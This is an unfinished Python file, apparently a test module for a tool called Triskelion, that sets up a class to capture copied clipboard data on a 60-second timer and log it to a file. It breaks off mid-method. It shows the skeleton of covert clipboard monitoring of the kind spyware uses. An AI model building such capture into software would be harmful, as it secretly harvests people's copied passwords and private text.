# This is to test the second functionality of Triskelion - Capturing copied clipboard data

import clipboard # for attaching global hooks to the clipboard data
from threading import Timer # the timer to capture the clipboard data
from datetime import datetime # capture the data

SEND_CLIPBOARD_DATA_EVERY = 60 # report to file after every 60 seconds i.e 1 minute (global variable)

class Clipboard:
    def __init__(self, report_method='file'):
        self.startdt = datetime.now() # appended in the reporting file to indicate the start date of capture
        self.enddt = datetime.now() #appended in the reporting file to indicate the end date of capture

        self.interval = SEND_CLIPBOARD_DATA_EVERY # interval for capturing the copied clipboard data
        self.log = " "


    def report_local(self):
        self